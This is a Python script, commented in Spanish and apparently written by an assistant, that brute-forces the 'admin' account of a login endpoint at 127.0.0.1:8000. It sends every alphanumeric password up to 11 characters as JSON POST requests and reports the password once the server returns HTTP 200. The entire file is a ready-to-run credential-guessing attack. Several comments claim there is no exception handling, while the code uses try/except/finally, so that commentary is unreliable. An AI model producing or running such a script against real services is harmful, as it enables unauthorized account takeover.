import requests
import json
import itertools
import time
import sys
# NO se importan las excepciones (ConnectionError, Timeout)

# NO se usan los imports de concurrencia para mantener la simplicidad extrema, 
# ya que su uso sin 'with' ni 'try/finally' es muy propenso a errores. 
# Usaremos la versión secuencial para evitar fallos catastróficos.
# Si deseas la versión CONCURRENTE sin try, avísame. (Es mucho más compleja de cerrar manualmente).
# Usaremos la versión secuencial simple aquí:

# --- Configuración del Ataque ---
URL = "http://127.0.0.1:8000/login"
USERNAME = "admin" 
ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
MAX_LENGTH = 11
SLEEP_TIME = 0.005 # Retraso mínimo para no saturar inmediatamente el bucle

print(f"--- Iniciando Ataque de FUERZA BRUTA INESTABLE (Secuencial) contra {URL} ---")
print(f"Usuario objetivo: {USERNAME}")
print(f"Longitud máxima a probar: {MAX_LENGTH}")
print("-" * 50)

def run_simple_brute_force_attack():
    session = requests.Session() # Apertura manual de la sesión
    
    start_time = time.time()
    intentos = 0
    encontrado = False
    password = "" # Inicializar la contraseña

    try: # Usamos un try/except general solo para la terminación del script
        for length in range(1, MAX_LENGTH + 1):
            print(f"\n--- Probando contraseñas de longitud {length} ---")
            
            # Genera todas las combinaciones posibles
            to_attempt = itertools.product(ALPHABET, repeat=length)
            
            for attempt_tuple in to_attempt:
                password = "".join(attempt_tuple)
                intentos += 1
                
                # Solo imprime cada 10,000 intentos
                if intentos % 10000 == 0 or intentos <= 10:
                    print(f"Intento {intentos:,}: {password}")

                payload = {
                    "username": USERNAME,
                    "password": password
                }
                headers = {
                    "Content-Type": "application/json"
                }
                
                # 🚫 SIN MANEJO DE EXCEPCIONES: Una falla de red aquí detendrá el script.
                time.sleep(SLEEP_TIME) 
                response = session.post(URL, headers=headers, data=json.dumps(payload), timeout=5)

                # Verificar el código de estado HTTP
                if response.status_code == 200:
                    encontrado = True
                    break # Éxito
                
                # Reportar códigos inesperados que no sean 401
                elif response.status_code != 401:
                    print(f"⚠️ Error inesperado del servidor ({response.status_code}) para la contraseña: {password}. ¿Hay un error 500?")
                    # NOTA: En un script sin try, podrías optar por salir aquí si el error es grave.
            
            if encontrado:
                break # Éxito
                
    except Exception as e:
        # Captura cualquier excepción, incluso las de conexión o las de tiempo de espera
        print(f"\n🚨 ERROR CRÍTICO NO MANEJADO: El script se detuvo. Causa: {e}")
        
    finally:
        # Cierre manual y obligatorio de la sesión
        session.close()
        
    tiempo_total = time.time() - start_time
    print("-" * 50)
    
    if encontrado:
        print(f"✅ ÉXITO! Contraseña encontrada: {password}")
    else:
        print("❌ FALLO! La contraseña no se encontró dentro del límite de longitud o caracteres.")
        
    print(f"Intentos totales: {intentos:,}")
    print(f"Tiempo total: {tiempo_total:.4f} segundos")

if __name__ == "__main__":
    run_simple_brute_force_attack()